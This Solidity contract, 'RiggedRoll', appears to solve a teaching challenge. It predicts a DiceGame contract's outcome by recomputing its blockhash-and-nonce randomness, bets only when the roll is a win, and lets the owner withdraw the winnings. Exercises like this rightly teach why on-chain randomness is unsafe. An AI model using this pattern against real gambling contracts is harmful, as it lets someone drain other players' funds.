pragma solidity >=0.8.0 <0.9.0;
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {
    DiceGame public diceGame;

    constructor(address payable diceGameAddress) {
        diceGame = DiceGame(diceGameAddress);
    }

    function withdraw(address payable _addr, uint256 _amount)
        external
        onlyOwner
    {
        require(_amount <= address(this).balance, "insufficient funds");
        _addr.transfer(_amount);
    }

    function riggedRoll() external {
        require(
            address(this).balance >= .002 ether,
            "balance low: top up the rig"
        );

        bytes32 prevHash = blockhash(block.number - 1);
        bytes32 hash = keccak256(
            abi.encodePacked(prevHash, address(diceGame), diceGame.nonce())
        );

        uint256 roll = uint256(hash) % 16;
        console.log("rigged roll is", roll);

        require(roll <= 2, "not smaller than 2");
        diceGame.rollTheDice{value: 0.002 ether}();
    }

    //Add receive() function so contract can receive Eth
    receive() external payable {}
}
